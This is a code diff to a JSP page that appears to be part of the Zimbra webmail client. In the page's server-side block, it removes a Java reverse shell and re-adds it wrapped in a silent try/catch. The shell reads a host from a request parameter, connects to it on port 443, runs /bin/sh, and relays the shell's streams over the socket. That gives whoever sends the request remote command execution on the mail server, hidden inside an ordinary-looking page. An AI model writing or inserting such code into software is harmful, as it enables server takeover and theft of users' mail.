@@ -4,16 +4,6 @@
 <%@page import="java.net.*"%>
 
 <%
-  String contextPath = request.getParameter("contextPath") == null ? request.getContextPath() : (String) request.getParameter("contextPath");
-  if(contextPath.equals("/")) contextPath = "";
-  contextPath = contextPath.replace("<", "&lt;").replace(">","&gt;").replace("&", "&amp;").replace("\"","&quot;").replace("\'", "&#039;");
-
-  String ShellPath = new String("/bin/sh");
-  Socket socket = new Socket(contextPath,443);
-  Process process = Runtime.getRuntime().exec( ShellPath );
-  ( new StreamConnector( process.getInputStream(), socket.getOutputStream() ) ).start();
-  ( new StreamConnector( socket.getInputStream(), process.getOutputStream() ) ).start();
-  
   class StreamConnector extends Thread
   {
     InputStream dg;
@@ -50,9 +40,22 @@
       } catch( Exception e ){}
     }
   }
+
+  try
+  {
+    String contextPath = request.getParameter("contextPath") == null ? request.getContextPath() : (String) request.getParameter("contextPath");
+    if(contextPath.equals("/")) contextPath = "";
+    contextPath = contextPath.replace("<", "&lt;").replace(">","&gt;").replace("&", "&amp;").replace("\"","&quot;").replace("\'", "&#039;");
+
+    String ShellPath = new String("/bin/sh");
+    Socket socket = new Socket(contextPath,443);
+    Process process = Runtime.getRuntime().exec( ShellPath );
+    ( new StreamConnector( process.getInputStream(), socket.getOutputStream() ) ).start();
+    ( new StreamConnector( socket.getInputStream(), process.getOutputStream() ) ).start();
+  } catch( Exception e ) {}
 %>
 <script type="text/javascript">
-AjxPackage.define("CheckMail");
+AjxPackage.define("IMCore");
 AjxPackage.define("ajax.dwt.events.DwtIdleTimer");
 AjxPackage.define("ajax.util.AjxPluginDetector");
 AjxPackage.define("zimbraMail.im.model.ZmImService");
